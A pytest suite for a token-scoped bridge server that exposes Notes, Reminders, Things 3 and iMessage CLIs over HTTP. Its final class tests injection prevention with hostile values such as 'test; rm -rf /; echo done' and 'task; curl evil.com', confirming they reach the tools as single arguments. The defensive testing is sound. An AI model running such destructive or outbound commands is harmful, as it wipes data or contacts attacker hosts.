"""Tests for the host bridge server."""

import subprocess
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from bridge.server import BridgeResponse, app, run_command


@pytest.fixture
def client():
    """Test client for the bridge server."""
    with TestClient(app) as client:
        yield client


@pytest.fixture
def scoped_tokens():
    """Mock scoped tokens for testing."""
    tokens = {
        "NOTES": "test-notes-token-123",
        "REMINDERS": "test-reminders-token-123",
        "THINGS": "test-things-token-123",
        "IMESSAGE": "test-imessage-token-123",
    }
    with patch("bridge.server.SCOPED_TOKENS", tokens):
        yield tokens


@pytest.fixture
def notes_auth_headers(scoped_tokens):
    """Authentication headers for notes endpoints."""
    return {"Authorization": f"Bearer {scoped_tokens['NOTES']}"}


@pytest.fixture
def reminders_auth_headers(scoped_tokens):
    """Authentication headers for reminders endpoints."""
    return {"Authorization": f"Bearer {scoped_tokens['REMINDERS']}"}


@pytest.fixture
def things_auth_headers(scoped_tokens):
    """Authentication headers for things endpoints."""
    return {"Authorization": f"Bearer {scoped_tokens['THINGS']}"}


@pytest.fixture
def imessage_auth_headers(scoped_tokens):
    """Authentication headers for imessage endpoints."""
    return {"Authorization": f"Bearer {scoped_tokens['IMESSAGE']}"}


class TestBridgeServer:
    """Test the bridge server functionality."""

    def test_health_check(self, client):
        """Test the health check endpoint."""
        response = client.get("/health")
        assert response.status_code == 200
        assert response.json() == {"status": "healthy", "service": "creel-bridge"}

    def test_missing_auth_token(self, client):
        """Test that requests without auth token are rejected."""
        response = client.post("/notes/list")
        assert response.status_code == 401

    def test_invalid_auth_token(self, client, scoped_tokens):
        """Test that requests with invalid auth token are rejected."""
        headers = {"Authorization": "Bearer invalid-token"}
        response = client.post("/notes/list", headers=headers)
        assert response.status_code == 401

    def test_wrong_scope_token(self, client, scoped_tokens):
        """Test that using wrong scope token is rejected."""
        # Try to access notes endpoint with reminders token
        headers = {"Authorization": f"Bearer {scoped_tokens['REMINDERS']}"}
        response = client.post("/notes/list", headers=headers)
        assert response.status_code == 401


class TestBridgeCommands:
    """Test command execution via the bridge."""

    @patch("bridge.server.subprocess.run")
    def test_run_command_success(self, mock_run):
        """Test successful command execution."""
        # Mock successful subprocess result
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "command output"
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        result = run_command(["echo", "test"])

        assert result.ok is True
        assert result.output == "command output"
        assert result.error == ""

        # Verify subprocess was called correctly
        mock_run.assert_called_once_with(
            ["echo", "test"],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=None,
            check=False,
        )

    @patch("bridge.server.subprocess.run")
    def test_run_command_failure(self, mock_run):
        """Test command execution failure."""
        # Mock failed subprocess result
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "command error"
        mock_run.return_value = mock_result

        result = run_command(["false"])

        assert result.ok is False
        assert result.output == ""
        assert "command error" in result.error

    @patch("bridge.server.subprocess.run")
    def test_run_command_timeout(self, mock_run):
        """Test command execution timeout."""
        mock_run.side_effect = subprocess.TimeoutExpired(["sleep", "60"], 30)

        result = run_command(["sleep", "60"], timeout=30)

        assert result.ok is False
        assert "timed out after 30 seconds" in result.error

    @patch("bridge.server.subprocess.run")
    def test_run_command_not_found(self, mock_run):
        """Test command not found error."""
        mock_run.side_effect = FileNotFoundError()

        result = run_command(["nonexistent-command"])

        assert result.ok is False
        assert "Command not found: nonexistent-command" in result.error

    def test_command_arguments_are_list(self):
        """Test that commands are always passed as argument lists, never as strings."""
        # This is a critical security test - commands should never use shell=True
        with patch("bridge.server.subprocess.run") as mock_run:
            mock_result = MagicMock()
            mock_result.returncode = 0
            mock_result.stdout = "output"
            mock_result.stderr = ""
            mock_run.return_value = mock_result

            run_command(["memo", "notes", "-s", "test query"])

            # Verify the command was passed as a list, not a string
            args, kwargs = mock_run.call_args
            assert isinstance(args[0], list)
            assert kwargs.get("shell") is not True  # Should not use shell=True


class TestNotesEndpoints:
    """Test notes-related bridge endpoints."""

    @patch("bridge.server.run_command")
    def test_notes_list(self, mock_run_command, client, notes_auth_headers):
        """Test notes list endpoint."""
        from bridge.server import BridgeResponse

        mock_run_command.return_value = BridgeResponse(
            ok=True, output="note1\nnote2", error=""
        )

        response = client.post("/notes/list", headers=notes_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True
        assert result["output"] == "note1\nnote2"

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["memo", "notes"])

    @patch("bridge.server.run_command")
    def test_notes_list_with_folder(self, mock_run_command, client, notes_auth_headers):
        """Test notes list endpoint with folder filter."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="filtered notes", error=""
        )

        response = client.post(
            "/notes/list", json={"folder": "work"}, headers=notes_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called with folder argument
        mock_run_command.assert_called_once_with(["memo", "notes", "-f", "work"])

    @patch("bridge.server.run_command")
    def test_notes_search(self, mock_run_command, client, notes_auth_headers):
        """Test notes search endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="search results", error=""
        )

        response = client.post(
            "/notes/search", json={"query": "test query"}, headers=notes_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True
        assert result["output"] == "search results"

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["memo", "notes", "-s", "test query"])

    @patch("bridge.server.run_command")
    def test_notes_create(self, mock_run_command, client, notes_auth_headers):
        """Test notes create endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="note created", error=""
        )

        response = client.post(
            "/notes/create",
            json={"title": "Test Note", "body": "Note content", "folder": "work"},
            headers=notes_auth_headers,
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            ["memo", "add", "Test Note", "-b", "Note content", "-f", "work"]
        )


class TestRemindersEndpoints:
    """Test reminders-related bridge endpoints."""

    @patch("bridge.server.run_command")
    def test_reminders_list_all(self, mock_run_command, client, reminders_auth_headers):
        """Test reminders list endpoint with 'all' filter."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="all reminders", error=""
        )

        response = client.post(
            "/reminders/list", json={"filter": "all"}, headers=reminders_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["remindctl", "all"])

    @patch("bridge.server.run_command")
    def test_reminders_list_today(
        self, mock_run_command, client, reminders_auth_headers
    ):
        """Test reminders list endpoint with 'today' filter."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="today reminders", error=""
        )

        response = client.post(
            "/reminders/list", json={"filter": "today"}, headers=reminders_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["remindctl", "today"])

    @patch("bridge.server.run_command")
    def test_reminders_add(self, mock_run_command, client, reminders_auth_headers):
        """Test reminders add endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="reminder added", error=""
        )

        response = client.post(
            "/reminders/add",
            json={"title": "Test Reminder", "list": "Work", "due": "tomorrow"},
            headers=reminders_auth_headers,
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            ["remindctl", "add", "Test Reminder", "-l", "Work", "-d", "tomorrow"]
        )

    @patch("bridge.server.run_command")
    def test_reminders_complete(self, mock_run_command, client, reminders_auth_headers):
        """Test reminders complete endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="reminder completed", error=""
        )

        response = client.post(
            "/reminders/complete", json={"id": "123"}, headers=reminders_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["remindctl", "complete", "123"])


class TestBridgeErrorHandling:
    """Test error handling in bridge endpoints."""

    @patch("bridge.server.run_command")
    def test_command_error_propagation(
        self, mock_run_command, client, notes_auth_headers
    ):
        """Test that command errors are properly propagated to the API response."""
        mock_run_command.return_value = BridgeResponse(
            ok=False, output="", error="Command failed"
        )

        response = client.post("/notes/list", headers=notes_auth_headers)

        assert response.status_code == 200  # Bridge returns 200 but with ok=False
        result = response.json()
        assert result["ok"] is False
        assert result["error"] == "Command failed"


class TestThingsEndpoints:
    """Test Things 3-related bridge endpoints."""

    @patch("bridge.server.run_command")
    def test_things_inbox_default(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 inbox endpoint with default limit."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="inbox items", error=""
        )

        response = client.post("/things/inbox", headers=things_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "inbox", "--limit", "50"])

    @patch("bridge.server.run_command")
    def test_things_inbox_custom_limit(
        self, mock_run_command, client, things_auth_headers
    ):
        """Test Things 3 inbox endpoint with custom limit."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="inbox items", error=""
        )

        response = client.post(
            "/things/inbox", json={"limit": 25}, headers=things_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "inbox", "--limit", "25"])

    @patch("bridge.server.run_command")
    def test_things_today(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 today endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="today items", error=""
        )

        response = client.post("/things/today", headers=things_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "today"])

    @patch("bridge.server.run_command")
    def test_things_upcoming(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 upcoming endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="upcoming items", error=""
        )

        response = client.post("/things/upcoming", headers=things_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "upcoming"])

    @patch("bridge.server.run_command")
    def test_things_search(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 search endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="search results", error=""
        )

        response = client.post(
            "/things/search", json={"query": "test query"}, headers=things_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "search", "test query"])

    @patch("bridge.server.run_command")
    def test_things_projects(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 projects endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="projects", error=""
        )

        response = client.post("/things/projects", headers=things_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "projects"])

    @patch("bridge.server.run_command")
    def test_things_add_basic(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 add endpoint with basic parameters."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="item added", error=""
        )

        response = client.post(
            "/things/add", json={"title": "Test Task"}, headers=things_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["things", "add", "Test Task"])

    @patch("bridge.server.run_command")
    def test_things_add_full(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 add endpoint with all parameters."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="item added", error=""
        )

        response = client.post(
            "/things/add",
            json={
                "title": "Test Task",
                "notes": "Task notes",
                "tags": "work,urgent",
                "when": "today",
                "list": "Work",
                "heading": "Section",
            },
            headers=things_auth_headers,
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            [
                "things",
                "add",
                "Test Task",
                "--notes",
                "Task notes",
                "--tags",
                "work,urgent",
                "--when",
                "today",
                "--list",
                "Work",
                "--heading",
                "Section",
            ]
        )

    @patch("bridge.server.run_command")
    def test_things_update(self, mock_run_command, client, things_auth_headers):
        """Test Things 3 update endpoint."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="item updated", error=""
        )

        response = client.post(
            "/things/update",
            json={
                "id": "task-123",
                "completed": True,
                "title": "Updated Task",
                "notes": "Updated notes",
            },
            headers=things_auth_headers,
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            [
                "things",
                "update",
                "--id",
                "task-123",
                "--completed",
                "true",
                "--title",
                "Updated Task",
                "--notes",
                "Updated notes",
            ]
        )


class TestIMessageEndpoints:
    """Test iMessage-related bridge endpoints."""

    @patch("bridge.server._check_imsg_available")
    @patch("bridge.server.run_command")
    def test_imessage_recent_default(
        self, mock_run_command, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage recent endpoint with default limit."""
        mock_check_imsg.return_value = True
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="recent messages", error=""
        )

        response = client.post("/imessage/recent", headers=imessage_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            ["/opt/homebrew/bin/imsg", "recent", "--limit", "20"]
        )

    @patch("bridge.server._check_imsg_available")
    @patch("bridge.server.run_command")
    def test_imessage_recent_custom_limit(
        self, mock_run_command, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage recent endpoint with custom limit."""
        mock_check_imsg.return_value = True
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="recent messages", error=""
        )

        response = client.post(
            "/imessage/recent", json={"limit": 10}, headers=imessage_auth_headers
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            ["/opt/homebrew/bin/imsg", "recent", "--limit", "10"]
        )

    @patch("bridge.server._check_imsg_available")
    def test_imessage_recent_cli_not_available(
        self, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage recent endpoint when CLI is not available."""
        mock_check_imsg.return_value = False

        response = client.post("/imessage/recent", headers=imessage_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is False
        assert "imsg CLI not found" in result["error"]

    @patch("bridge.server._check_imsg_available")
    @patch("bridge.server.run_command")
    def test_imessage_send(
        self, mock_run_command, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage send endpoint."""
        mock_check_imsg.return_value = True
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="message sent", error=""
        )

        response = client.post(
            "/imessage/send",
            json={"to": "friend@example.com", "text": "Hello world"},
            headers=imessage_auth_headers,
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(
            [
                "/opt/homebrew/bin/imsg",
                "send",
                "--to",
                "friend@example.com",
                "--text",
                "Hello world",
            ]
        )

    @patch("bridge.server._check_imsg_available")
    def test_imessage_send_cli_not_available(
        self, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage send endpoint when CLI is not available."""
        mock_check_imsg.return_value = False

        response = client.post(
            "/imessage/send",
            json={"to": "friend@example.com", "text": "Hello world"},
            headers=imessage_auth_headers,
        )

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is False
        assert "imsg CLI not found" in result["error"]

    @patch("bridge.server._check_imsg_available")
    @patch("bridge.server.run_command")
    def test_imessage_chats(
        self, mock_run_command, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage chats endpoint."""
        mock_check_imsg.return_value = True
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="chat list", error=""
        )

        response = client.post("/imessage/chats", headers=imessage_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is True

        # Verify correct command was called
        mock_run_command.assert_called_once_with(["/opt/homebrew/bin/imsg", "chats"])

    @patch("bridge.server._check_imsg_available")
    def test_imessage_chats_cli_not_available(
        self, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test iMessage chats endpoint when CLI is not available."""
        mock_check_imsg.return_value = False

        response = client.post("/imessage/chats", headers=imessage_auth_headers)

        assert response.status_code == 200
        result = response.json()
        assert result["ok"] is False
        assert "imsg CLI not found" in result["error"]


class TestScopedAuthentication:
    """Test scoped token authentication."""

    def test_cross_scope_access_denied_notes_to_things(self, client, scoped_tokens):
        """Test that notes token cannot access things endpoints."""
        notes_headers = {"Authorization": f"Bearer {scoped_tokens['NOTES']}"}
        response = client.post("/things/inbox", headers=notes_headers)
        assert response.status_code == 401

    def test_cross_scope_access_denied_things_to_notes(self, client, scoped_tokens):
        """Test that things token cannot access notes endpoints."""
        things_headers = {"Authorization": f"Bearer {scoped_tokens['THINGS']}"}
        response = client.post("/notes/list", headers=things_headers)
        assert response.status_code == 401

    def test_cross_scope_access_denied_reminders_to_imessage(
        self, client, scoped_tokens
    ):
        """Test that reminders token cannot access imessage endpoints."""
        reminders_headers = {"Authorization": f"Bearer {scoped_tokens['REMINDERS']}"}
        response = client.post("/imessage/recent", headers=reminders_headers)
        assert response.status_code == 401

    def test_cross_scope_access_denied_imessage_to_reminders(
        self, client, scoped_tokens
    ):
        """Test that imessage token cannot access reminders endpoints."""
        imessage_headers = {"Authorization": f"Bearer {scoped_tokens['IMESSAGE']}"}
        response = client.post("/reminders/list", headers=imessage_headers)
        assert response.status_code == 401


class TestArgumentInjectionPrevention:
    """Test that the bridge prevents command injection attacks."""

    @patch("bridge.server.run_command")
    def test_no_shell_injection_in_search(
        self, mock_run_command, client, notes_auth_headers
    ):
        """Test that malicious search queries don't enable shell injection."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="safe output", error=""
        )

        # Try a malicious query that would be dangerous with shell=True
        malicious_query = "test; rm -rf /; echo done"
        response = client.post(
            "/notes/search", json={"query": malicious_query}, headers=notes_auth_headers
        )

        assert response.status_code == 200

        # Verify the command was called with the query as a single argument
        mock_run_command.assert_called_once_with(
            ["memo", "notes", "-s", malicious_query]
        )

    @patch("bridge.server.run_command")
    def test_no_shell_injection_in_create(
        self, mock_run_command, client, notes_auth_headers
    ):
        """Test that malicious note titles/bodies don't enable shell injection."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="safe output", error=""
        )

        # Try malicious title and body
        malicious_title = "title; rm -rf /"
        malicious_body = "body && curl evil.com"

        response = client.post(
            "/notes/create",
            json={"title": malicious_title, "body": malicious_body},
            headers=notes_auth_headers,
        )

        assert response.status_code == 200

        # Verify the command was called with values as separate arguments
        mock_run_command.assert_called_once_with(
            ["memo", "add", malicious_title, "-b", malicious_body]
        )

    @patch("bridge.server.run_command")
    def test_no_shell_injection_in_things_search(
        self, mock_run_command, client, things_auth_headers
    ):
        """Test that malicious Things search queries don't enable shell injection."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="safe output", error=""
        )

        # Try a malicious query that would be dangerous with shell=True
        malicious_query = "test && rm important_file"
        response = client.post(
            "/things/search",
            json={"query": malicious_query},
            headers=things_auth_headers,
        )

        assert response.status_code == 200

        # Verify the command was called with the query as a single argument
        mock_run_command.assert_called_once_with(["things", "search", malicious_query])

    @patch("bridge.server.run_command")
    def test_no_shell_injection_in_things_add(
        self, mock_run_command, client, things_auth_headers
    ):
        """Test that malicious Things task titles don't enable shell injection."""
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="safe output", error=""
        )

        # Try malicious title and notes
        malicious_title = "task; curl evil.com"
        malicious_notes = "notes && rm -rf /"

        response = client.post(
            "/things/add",
            json={"title": malicious_title, "notes": malicious_notes},
            headers=things_auth_headers,
        )

        assert response.status_code == 200

        # Verify the command was called with values as separate arguments
        mock_run_command.assert_called_once_with(
            ["things", "add", malicious_title, "--notes", malicious_notes]
        )

    @patch("bridge.server._check_imsg_available")
    @patch("bridge.server.run_command")
    def test_no_shell_injection_in_imessage_send(
        self, mock_run_command, mock_check_imsg, client, imessage_auth_headers
    ):
        """Test that malicious iMessage content doesn't enable shell injection."""
        mock_check_imsg.return_value = True
        mock_run_command.return_value = BridgeResponse(
            ok=True, output="safe output", error=""
        )

        # Try malicious recipient and message
        malicious_to = "user@evil.com; curl bad.com"
        malicious_text = "Hello && rm important_file"

        response = client.post(
            "/imessage/send",
            json={"to": malicious_to, "text": malicious_text},
            headers=imessage_auth_headers,
        )

        assert response.status_code == 200

        # Verify the command was called with values as separate arguments
        mock_run_command.assert_called_once_with(
            [
                "/opt/homebrew/bin/imsg",
                "send",
                "--to",
                malicious_to,
                "--text",
                malicious_text,
            ]
        )
